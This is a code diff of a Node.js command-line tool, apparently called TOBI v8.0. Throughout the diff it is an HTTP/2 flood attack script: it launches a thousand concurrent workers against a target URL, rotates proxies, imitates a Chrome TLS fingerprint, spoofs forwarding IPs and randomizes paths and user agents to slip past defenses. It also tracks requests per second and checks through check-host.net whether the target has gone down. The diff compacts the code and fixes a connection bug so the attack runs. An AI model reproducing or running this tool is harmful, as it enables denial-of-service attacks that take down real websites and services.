@@ -1,11 +1,5 @@
 #!/usr/bin/env node
 
-/**
- * TOBI v8.0 – Ultimate Edition (MegaMedusa compatible)
- * Features: HTTP/2, TLS fingerprint, proxy rotation, check-host.net
- * No external dependencies – pure Node.js
- */
-
 const fs = require('fs');
 const net = require('net');
 const tls = require('tls');
@@ -20,14 +14,12 @@ const c = {
     cyan: '\x1b[96m', bold: '\x1b[1m', reset: '\x1b[0m', clear: '\x1b[2J\x1b[H'
 };
 
-// ==================== CONFIG ====================
 let target = null;
 let duration = 60;
 let workers = 1000;
 let proxyFile = null;
 let stop = false;
 
-// ==================== PROXY LOADER ====================
 let proxies = [];
 let proxyIndex = 0;
 
@@ -35,10 +27,7 @@ function loadProxies() {
     if (!proxyFile) return;
     try {
         const content = fs.readFileSync(proxyFile, 'utf8');
-        proxies = content.split('\n').filter(l => {
-            l = l.trim();
-            return l && !l.startsWith('#') && l.includes(':');
-        });
+        proxies = content.split('\n').filter(l => l.trim() && !l.startsWith('#') && l.includes(':'));
         console.log(`${c.green}[✓] Loaded ${proxies.length} proxies${c.reset}`);
     } catch(e) {
         console.log(`${c.yellow}[!] No proxy file – running without proxies${c.reset}`);
@@ -51,7 +40,6 @@ function getProxy() {
     return proxies[proxyIndex];
 }
 
-// ==================== TLS FINGERPRINT (Chrome 122) ====================
 const TLS_CIPHERS = [
     'TLS_AES_256_GCM_SHA384',
     'TLS_CHACHA20_POLY1305_SHA256',
@@ -74,18 +62,9 @@ const TLS_OPTIONS = {
     ALPNProtocols: ['h2', 'http/1.1']
 };
 
-// ==================== HEADER & PATH GENERATORS ====================
-function randomString(len) {
-    return crypto.randomBytes(len).toString('hex');
-}
-
-function randomInt(min, max) {
-    return Math.floor(Math.random() * (max - min + 1)) + min;
-}
-
-function spoofIP() {
-    return `${randomInt(1,255)}.${randomInt(0,255)}.${randomInt(0,255)}.${randomInt(1,254)}`;
-}
+function randomString(len) { return crypto.randomBytes(len).toString('hex'); }
+function randomInt(min, max) { return Math.floor(Math.random() * (max - min + 1)) + min; }
+function spoofIP() { return `${randomInt(1,255)}.${randomInt(0,255)}.${randomInt(0,255)}.${randomInt(1,254)}`; }
 
 const USER_AGENTS = [
     'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36',
@@ -94,10 +73,7 @@ const USER_AGENTS = [
     'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:123.0) Gecko/20100101 Firefox/123.0'
 ];
 
-function generatePath() {
-    return `/${randomString(8)}?t=${Date.now()}&r=${randomString(6)}`;
-}
-
+function generatePath() { return `/${randomString(8)}?t=${Date.now()}&r=${randomString(6)}`; }
 function generateHeaders(host) {
     return {
         ':method': 'GET',
@@ -115,9 +91,8 @@ function generateHeaders(host) {
     };
 }
 
-// ==================== HTTP/2 ATTACK FUNCTION ====================
 function attack(targetUrl, callback) {
-    // ENSURE PROTOCOL (FIX for Invalid URL)
+    // Ensure full URL
     if (!targetUrl.startsWith('http')) targetUrl = 'https://' + targetUrl;
     const parsed = new URL(targetUrl);
     const proxy = getProxy();
@@ -125,7 +100,8 @@ function attack(targetUrl, callback) {
     const start = Date.now();
 
     const createSession = (tlsSocket) => {
-        const session = http2.connect(parsed.hostname, {
+        // FIX: use full targetUrl, not just hostname
+        const session = http2.connect(targetUrl, {
             createConnection: () => tlsSocket,
             ...TLS_OPTIONS
         });
@@ -171,7 +147,6 @@ function attack(targetUrl, callback) {
     }
 }
 
-// ==================== CHECK-HOST.NET ====================
 function checkHost(target) {
     return new Promise((resolve) => {
         const checkUrl = `https://check-host.net/check-http?host=${encodeURIComponent(target)}`;
@@ -192,11 +167,7 @@ function checkHost(target) {
     });
 }
 
-// ==================== STATISTICS ====================
-let stats = {
-    total: 0, success: 0, failed: 0,
-    startTime: null, lastSec: 0, lastSecCount: 0, peakRps: 0
-};
+let stats = { total: 0, success: 0, failed: 0, startTime: null, lastSec: 0, lastSecCount: 0, peakRps: 0 };
 
 function displayStats() {
     const elapsed = (Date.now() - stats.startTime) / 1000;
@@ -209,7 +180,6 @@ function displayStats() {
         `${c.dim}${elapsed.toFixed(0)}s${c.reset}`);
 }
 
-// ==================== WORKER (INSTANT LOOP) ====================
 function worker() {
     if (stop) return;
     attack(target, (success) => {
@@ -227,9 +197,8 @@ function worker() {
     });
 }
 
-// ==================== MAIN ====================
 async function start() {
-    // FIX: add https:// if missing
+    // Fix protocol
     if (!target.startsWith('http')) target = 'https://' + target;
 
     console.log(c.clear);
@@ -250,9 +219,7 @@ async function start() {
     stats.lastSec = stats.startTime / 1000;
 
     console.log(`${c.yellow}[!] Launching ${workers} workers...${c.reset}`);
-    for (let i = 0; i < workers; i++) {
-        worker();
-    }
+    for (let i = 0; i < workers; i++) worker();
     console.log(`${c.green}[✓] All workers launched!${c.reset}\n`);
 
     const interval = setInterval(displayStats, 1000);
@@ -278,12 +245,9 @@ async function start() {
         }, 1000);
     });
 
-    setTimeout(() => {
-        stop = true;
-    }, duration * 1000);
+    setTimeout(() => { stop = true; }, duration * 1000);
 }
 
-// ==================== COMMAND LINE / INTERACTIVE ====================
 (async () => {
     if (process.argv[2]) {
         target = process.argv[2];
